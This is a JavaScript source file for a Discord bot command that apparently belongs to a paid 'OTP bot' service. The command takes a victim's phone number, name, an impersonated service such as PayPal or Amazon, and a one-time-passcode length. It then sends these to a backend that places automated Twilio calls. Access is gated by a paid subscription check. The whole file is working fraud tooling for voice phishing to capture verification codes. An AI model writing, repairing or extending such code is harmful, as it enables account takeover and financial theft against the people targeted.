require('dotenv').config()
const config = process.env

const axios = require('axios');
const qs = require('qs');

const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
Database = require('../Database/mongoose')
const userModel = require("../Database/Schema/Users")
const twilio = require('twilio');
const tClient = new twilio(config.accSID, config.authToken);
const VoiceResponse = twilio.twiml.VoiceResponse;
const response = new VoiceResponse();
const moment = require('moment');
moment.suppressDeprecationWarnings = true;

module.exports = {
	data: new SlashCommandBuilder()
		.setName('call')
		.setDescription('Call a target')
        .addStringOption(option => 
            option.setName('phone')
                .setDescription('Number to call does not need +1')
                .setRequired(true),
        ).addStringOption(option => 
            option.setName('name')
                .setDescription('Persons name')
                .setRequired(true),
        ).addStringOption(option => 
            option.setName('service')
                .setDescription('Example: PayPal, Amazon, Ebay...')
                .setRequired(true),
        ).addIntegerOption(option => 
            option.setName('digits')
                .setDescription('OTP Digit Length')
                .setRequired(true)
                .addChoices(
					{ name: '4', value: 4 },
					{ name: '5', value: 5 },
					{ name: '6', value: 6 },
					{ name: '7', value: 7 },
					{ name: '8', value: 8 },
					{ name: '9', value: 9 },
				)
        ),
	async execute(interaction) {
        let number = interaction.options.getString('phone');
        let name = interaction.options.getString('name');
        let service = interaction.options.getString('service');
        let digitl = interaction.options.getInteger('digits');

        let userDB = await userModel.findOne({ UserID: interaction.user.id });
        if(userDB){
            let diff = moment().diff(userDB.Time);

            if(interaction.channel.id != config.callchan1){
                interaction.reply(`This command can only be used in <#${config.callchan1}>`).catch(err => {
                    console.log(err)
                })
            }else{
                if(diff > 0){
                    await interaction.reply(`You do not have an active subscription`).catch(err => {
                        console.log(err)
                    })
                }else{
                    if(!number.match(/^\d{10}$/g)){
                        await interaction.reply(`This phone number ${number} is not good, a good one : **9524917895**`).catch(err => {
                            console.log(err)
                        })
                    }else if(!service.match(/[a-zA-Z]+/gm)){
                        await interaction.reply(`This service name ${service} is not good, a good one : **paypal**`).catch(err => {
                            console.log(err)
                        })
                    }else{
                        await interaction.reply(`:calling: Calling **${name}** at **${number}** as **${service}**\nKeep an eye out in <#1040646091705700442>`).catch(err => {
                            console.log(err)
                        })
                        axios.post(config.apiurl + '/call/', qs.stringify({
                            password: config.apipassword,
                            to: number,
                            user: `${interaction.user.id}`,
                            service: service.toLowerCase(),
                            name: name.toLowerCase() || null,
                            digitleng: digitl
                        }))
                        .catch(error => {
                            console.error(error)
                        })
                    }
                }
            }
        }else{
            await interaction.reply(`You do not have an active subscription. If you believe this was an error please open a ticket!`).catch(err => {
                console.log(err)
            })
        }
	},
};